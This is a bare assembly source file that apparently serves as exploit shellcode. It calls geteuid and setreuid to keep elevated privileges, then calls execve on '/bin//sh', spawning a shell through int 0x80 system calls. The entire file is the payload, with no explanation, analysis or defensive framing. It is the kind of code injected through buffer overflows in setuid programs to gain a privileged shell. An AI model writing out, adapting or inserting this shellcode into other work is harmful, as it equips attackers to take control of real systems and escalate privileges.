section .text

global _start

_start:
 push 0x31
 pop rax
 cdq
 int 0x80
 mov ebx, eax
 mov ecx, eax
 push 0x46
 pop rax
 int 0x80
 mov al, 0xb
 push rdx
 push 0x68732f6e
 push 0x69622f2f
 mov ebx, esp
 mov ecx, edx
 int 0x80
